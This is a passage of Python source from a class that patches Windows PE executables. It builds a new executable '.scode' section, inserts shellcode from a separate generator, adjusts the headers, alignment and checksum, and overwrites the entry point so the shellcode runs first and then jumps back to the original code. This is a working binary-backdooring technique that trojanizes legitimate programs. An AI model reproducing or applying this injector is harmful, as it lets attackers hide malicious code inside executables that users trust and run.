            base_of_data_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_BASE_OF_DATA_RVA)
            base_of_data_rva += self.rva_delta
            MultiByteHandler.set_dword_given_offset(self.binary_data, header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_BASE_OF_DATA_RVA, base_of_data_rva)


    def __adjust_windows_specific_headers(self, header_offset, new_section_rva, new_section_virtual_size):
        # SizeOfImage
        size_of_image_offset = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_SIZE_OF_IMAGE
        potentially_unaligned_size_of_image = new_section_rva + new_section_virtual_size
        aligned_size_of_image = potentially_unaligned_size_of_image + Win32BinaryUtils.compute_padding_size_for_section_alignment(self.binary_data, header_offset, potentially_unaligned_size_of_image)
        MultiByteHandler.set_dword_given_offset(self.binary_data, size_of_image_offset, aligned_size_of_image)

        # SifeOfHeaders
        size_of_headers_offset = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_SIZE_OF_HEADERS
        current_size_of_headers = MultiByteHandler.get_dword_given_offset(self.binary_data, size_of_headers_offset)
        updated_size_of_headers = current_size_of_headers + Win32BinaryOffsetsAndSizes.SIZE_OF_SECTION_HEADER
        padding = Win32BinaryUtils.compute_padding_size_for_file_alignment(self.binary_data, header_offset, updated_size_of_headers)
        MultiByteHandler.set_dword_given_offset(self.binary_data, size_of_headers_offset, updated_size_of_headers + padding)


    def __set_rva_delta(self, header_offset):
        """
                :param header_offset:
                :return: This class returns nothing. It is meant to check if it is possible to write the new header between the last header and the first section.

        """

        #The header is smaller than this but this is adjusted and therefore padded to file alignment. The next section starts right after
        current_size_of_headers = MultiByteHandler.get_dword_given_offset(self.binary_data, header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_SIZE_OF_HEADERS)
        new_size_of_headers_unpadded = current_size_of_headers + Win32BinaryOffsetsAndSizes.SIZE_OF_SECTION_HEADER
        padding_for_new_header = Win32BinaryUtils.compute_padding_size_for_file_alignment(self.binary_data, header_offset, new_size_of_headers_unpadded)
        self.header_padding = padding_for_new_header
        new_size_of_headers = new_size_of_headers_unpadded + padding_for_new_header

        #I have to check if the RAW size of the header crosses the RVA for the text section. For now, i can ignore. However i need to pad the header.
        rva_for_first_section = MultiByteHandler.get_dword_given_offset(self.binary_data, header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_BEGINNING_OF_SECTION_HEADERS + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_RVA_WITHIN_SECTION_HEADER)
        if new_size_of_headers > rva_for_first_section:
            print("Added section crossing RVA for first section. This mode will not work. Leaving...")
            sys.exit(1)
            '''
            #virtual_rva_delta = Win32BinaryUtils.compute_padding_size_for_section_alignment(self.binary_data, header_offset, new_size_of_headers)
            #self.rva_delta =  new_size_of_headers + virtual_rva_delta - rva_for_first_section
            '''
        return

    def __file_align_shell_code(self, header_offset, jump_displacement):
        non_padded_shell_code = self.shell_code_generator.get_base_shell_code(jump_displacement)
        padding_size = Win32BinaryUtils.compute_padding_size_for_file_alignment(self.binary_data, header_offset, len(non_padded_shell_code))
        padded_shell_code = self.shell_code_generator.get_padded_shell_code(padding_size)
        self.shell_code = padded_shell_code


    def __overwrite_entrypoint_rva(self, header_offset):
        #Get current RVA for entrypoint
        offset_for_address_of_entrypoint_rva_on_the_header =  header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_ENTRYPOINT_RVA

        #Get header offset for new header
        raw_offset_for_shell_code_section_header = Win32BinaryUtils.get_raw_offset_for_last_section_header(self.binary_data, header_offset)
        rva_for_shell_code_section_header = MultiByteHandler.get_dword_given_offset(self.binary_data, raw_offset_for_shell_code_section_header + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_RVA_WITHIN_SECTION_HEADER)

        #Overwrite current RVA for entrypoint with the new one.
        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_for_address_of_entrypoint_rva_on_the_header,rva_for_shell_code_section_header)

        # Adjust BaseOfCode
        #MultiByteHandler.set_dword_given_offset(self.binary_data, header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_BASE_OF_CODE_RVA, rva_for_shell_code_section_header)

    def __update_checksum(self, header_offset):
        checksum_offset = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_CHECKSUM
        checksum = Win32BinaryUtils.compute_checksum(self.binary_data, header_offset)
        MultiByteHandler.set_dword_given_offset(self.binary_data, checksum_offset, checksum)

    def __append_data_at_offset(self, data, offset):
        first_half = self.binary_data[0:offset]
        second_half = self.binary_data[offset:]
        first_half.extend(data)
        first_half.extend(second_half)
        self.binary_data = first_half

    def __get_new_header(self, virtual_size, virtual_address, size_of_raw_data, pointer_to_raw_data):
        """
        :param virtual_size:
        :param virtual_address:
        :param size_of_raw_data:
        :param pointer_to_raw_data:
        :return: Returns a new header for the shellcode section.
        """

        new_section_header = [0] * Win32BinaryOffsetsAndSizes.SIZE_OF_SECTION_HEADER
        new_section_header_index = 0

        section_name_bytes = '.scode\00\00'.encode('utf-8')
        first_half = section_name_bytes[3::-1]
        second_half = section_name_bytes[-1:-5:-1]
        MultiByteHandler.set_dword_given_offset(new_section_header, new_section_header_index, int("".join("{:02x}".format(ord(c)) for c in first_half), 16))
        MultiByteHandler.set_dword_given_offset(new_section_header, new_section_header_index + 4, int("".join("{:02x}".format(ord(c)) for c in second_half), 16))
        new_section_header_index += 8

        MultiByteHandler.set_dword_given_offset(new_section_header, new_section_header_index, virtual_size)
        new_section_header_index += 4

        MultiByteHandler.set_dword_given_offset(new_section_header, new_section_header_index, virtual_address)
        new_section_header_index += 4

        MultiByteHandler.set_dword_given_offset(new_section_header, new_section_header_index, size_of_raw_data)
        new_section_header_index += 4

        MultiByteHandler.set_dword_given_offset(new_section_header, new_section_header_index, pointer_to_raw_data)
        new_section_header_index += 4

        pointer_to_relocations = 0
        MultiByteHandler.set_dword_given_offset(new_section_header, new_section_header_index, pointer_to_relocations)
        new_section_header_index += 4
        pointer_to_line_numbers = 0
        MultiByteHandler.set_dword_given_offset(new_section_header, new_section_header_index, pointer_to_line_numbers)
        new_section_header_index += 4
        number_of_relocations = 0
        MultiByteHandler.set_word_given_offset(new_section_header, new_section_header_index, number_of_relocations)
        new_section_header_index += 2
        number_of_line_numbers = 0
        MultiByteHandler.set_word_given_offset(new_section_header, new_section_header_index, number_of_line_numbers)
        new_section_header_index += 2
        characteristics = (0x00000020 | 0x20000000 | 0x40000000)
        MultiByteHandler.set_dword_given_offset(new_section_header, new_section_header_index, characteristics)
        return new_section_header

    def modify_binary(self):

        header_offset = MultiByteHandler.get_dword_given_offset(self.binary_data, Win32BinaryOffsetsAndSizes.OFFSET_TO_PE_HEADER_OFFSET)
        beginning_of_last_section_header = Win32BinaryUtils.get_raw_offset_for_last_section_header(self.binary_data, header_offset)

        self.__set_rva_delta(header_offset)

        #Computing RVA for last section
        last_section_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, beginning_of_last_section_header + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_RVA_WITHIN_SECTION_HEADER)
        last_section_virtual_size = MultiByteHandler.get_dword_given_offset(self.binary_data, beginning_of_last_section_header + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_VIRTUAL_SIZE_WITHIN_SECTION_HEADER)
        potentially_unaligned_rva = last_section_rva + last_section_virtual_size
        new_section_rva = potentially_unaligned_rva + Win32BinaryUtils.compute_padding_size_for_section_alignment(self.binary_data, header_offset, potentially_unaligned_rva)

        #Computing RAW for last section
        last_section_raw_offset = MultiByteHandler.get_dword_given_offset(self.binary_data, beginning_of_last_section_header + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_RAW_OFFSET_WITHIN_SECTION_HEADER)
        last_section_raw_size = MultiByteHandler.get_dword_given_offset(self.binary_data, beginning_of_last_section_header + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_RAW_SIZE_WITHIN_SECTION_HEADER)
        new_section_raw_offset = last_section_raw_offset + last_section_raw_size + Win32BinaryOffsetsAndSizes.SIZE_OF_SECTION_HEADER + self.header_padding


        #RVA for Entrypoint
        offset_for_address_of_entrypoint_rva_on_the_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_ENTRYPOINT_RVA
        entrypoint_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_for_address_of_entrypoint_rva_on_the_header)


        self.__file_align_shell_code(header_offset, entrypoint_rva - new_section_rva)

        self.__adjust_data_directories(header_offset)
        self.__adjust_section_headers(header_offset)
        self.__adjust_standard_coff_fields_and_coff_header(header_offset, len(self.shell_code))#<-Size of code

        #Injecting header
        new_initialized_header = self.__get_new_header(len(self.shell_code), new_section_rva + self.rva_delta, len(self.shell_code), new_section_raw_offset)
        new_initialized_header.extend([0 for x in range(0,self.header_padding)])
        self.__append_data_at_offset(new_initialized_header, Win32BinaryUtils.get_raw_offset_for_last_section_header(self.binary_data, header_offset))

        #Injecting shellcode
        self.__append_data_at_offset(self.shell_code, new_section_raw_offset)
        self.__adjust_windows_specific_headers(header_offset, new_section_rva + self.rva_delta, len(self.shell_code))

        #Redirect execution to shellcode
        self.__overwrite_entrypoint_rva(header_offset)

        self.__update_checksum(header_offset)

        return self.binary_data



    def __init__(self, binary_data, shell_code_generator):
        self.binary_data = binary_data
        self.shell_code_generator = shell_code_generator
        self.shell_code = None
        self.rva_delta = 0
        self.header_padding = 0